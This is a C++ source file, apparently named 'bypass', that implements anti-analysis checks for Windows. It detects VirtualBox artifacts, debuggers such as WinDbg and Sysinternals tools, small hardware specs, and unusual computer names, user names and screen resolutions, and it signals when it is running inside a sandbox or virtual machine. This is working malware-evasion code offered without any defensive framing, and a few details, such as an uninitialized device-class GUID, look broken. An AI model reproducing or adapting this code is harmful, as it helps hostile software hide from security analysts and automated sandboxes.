#include "bypass.h"
#include <Windows.h>
#include <setupapi.h>
#include <winternl.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <TlHelp32.h>
#include <iostream>
#include <wchar.h>


bool CALLBACK MonitorDector(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)
{
	MONITORINFO monitorInfo;
	monitorInfo.cbSize = sizeof(MONITORINFO);
	GetMonitorInfoW(hMonitor, &monitorInfo);
	int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
	int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;
	if (xResolution < 0) xResolution = -xResolution;
	if (yResolution < 0) yResolution = -yResolution;
	if ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)
		|| (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))
	{
		*((BOOL*)data) = true;
	}
	return true;
}

DWORD GetParentPID(DWORD pid)
{
	DWORD ppid = 0;
	PROCESSENTRY32W processEntry = { 0 };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32FirstW(hSnapshot, &processEntry))
	{
		do
		{
			if (processEntry.th32ProcessID == pid)
			{
				ppid = processEntry.th32ParentProcessID;
				break;
			}
		} while (Process32NextW(hSnapshot, &processEntry));
	}
	CloseHandle(hSnapshot);
	return ppid;
}

BOOL CALLBACK EnumWindowsProc(HWND hWindow, LPARAM parameter)
{
	WCHAR windowTitle[1024];
	GetWindowTextW(hWindow, windowTitle, sizeof(windowTitle));
	CharUpperW(windowTitle);
	if (wcsstr(windowTitle, L"SYSINTERNALS")) *(PBOOL)parameter = true;
	return true;
}

bool HWIDCheck() {
     SYSTEM_INFO systeminfo;
    GetSystemInfo(&systeminfo);

    if(systeminfo.dwNumberOfProcessors < 2) return false;

     MEMORYSTATUSEX memorystatus;
    memorystatus.dwLength = sizeof(memorystatus);
    GlobalMemoryStatusEx(&memorystatus);
    DWORD RAM = memorystatus.ullTotalPhys / 1024 / 1024;
    if(RAM < 1024) return false;

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pdisk;
    DWORD junk = 0;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pdisk, sizeof(pdisk), &junk, (LPOVERLAPPED) NULL);
    DWORD diskSize = pdisk.Cylinders.QuadPart * (ULONG)pdisk.TracksPerCylinder * (ULONG)pdisk.SectorsPerTrack * (ULONG)pdisk.BytesPerSector / 1024 / 1024 / 1024;
    if(diskSize < 100) return false;

    GUID GUID_DEVCLASS_DISKDRIVE;

    HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&GUID_DEVCLASS_DISKDRIVE, NULL, NULL, DIGCF_PRESENT);
    SP_DEVINFO_DATA deviceInfoData;
    deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
    SetupDiEnumDeviceInfo(hDeviceInfo, 0, &deviceInfoData);
    DWORD propretyBufferSize;
    SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_HARDWAREID, NULL, NULL, 0, &propretyBufferSize);
    PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propretyBufferSize);
    SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &deviceInfoData, SPDRP_HARDWAREID, NULL, (PBYTE)HDDName, propretyBufferSize, NULL);
    CharUpperW(HDDName);
    if(wcsstr(HDDName,L"VBOX")) return false;

    DWORD adaptersListSize = 0;
    GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &adaptersListSize);
    IP_ADAPTER_ADDRESSES* pAdaptatersAdresses = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,adaptersListSize);
    if(pAdaptatersAdresses)
    {
        GetAdaptersAddresses(AF_UNSPEC, 0,0,pAdaptatersAdresses,&adaptersListSize);
        char mac[6] = {0};
        while(pAdaptatersAdresses) {
            if(pAdaptatersAdresses->PhysicalAddressLength == 6) {
                memcpy(mac, pAdaptatersAdresses->PhysicalAddress, 6);
                if(!memcmp(mac, "\x00\x00\x27", 3)) return false;
            }
            pAdaptatersAdresses = pAdaptatersAdresses->Next;
        }
    }
    
    WIN32_FIND_DATAW findFileData;

    if(FindFirstFileW(L"C:\\Windows\\System32\\Vbox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return false;

    HKEY hkResult;
    if(RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBOXSF", 0, KEY_READ, &hkResult) == ERROR_SUCCESS) return false;

    DWORD parentID = GetParentPID(GetCurrentProcessId());
    WCHAR parentName[MAX_PATH+1];
    DWORD dwParentName = MAX_PATH;

    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentID);
    QueryFullProcessImageNameW(hParent,0,parentName,&dwParentName);
    CharUpperW(parentName);
    if(wcsstr(parentName,L"WINDBG")) return false;

    bool debugged = false;
    EnumWindows(EnumWindowsProc, (LPARAM)&debugged);
    if(debugged) return false;

    DWORD computernameSize = MAX_COMPUTERNAME_LENGTH+1;
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH+1];
    GetComputerNameW(computerName, &computernameSize);
    CharUpperW(computerName);
    if(!wcsstr(computerName,L"DESKTOP-")) return false;

    DWORD userLenght = UNLEN;
    wchar_t userName[UNLEN+1];
    GetUserNameW(userName, &userLenght);
    CharUpperW(userName);
    if(wcsstr(userName,L"ADMIN")) return false;

    MONITORENUMPROC callback = (MONITORENUMPROC)MonitorDector;
    int xResolution = GetSystemMetrics(SM_CXSCREEN);
    int yResolution = GetSystemMetrics(SM_CYSCREEN);
    if(xResolution < 1000 || yResolution < 1000) return false;

    int monitorCount = GetSystemMetrics(SM_CMONITORS);
    bool sandbox = false;
    EnumDisplayMonitors(NULL, NULL, callback, (LPARAM)&sandbox);
    if(sandbox) return false;
return true;
}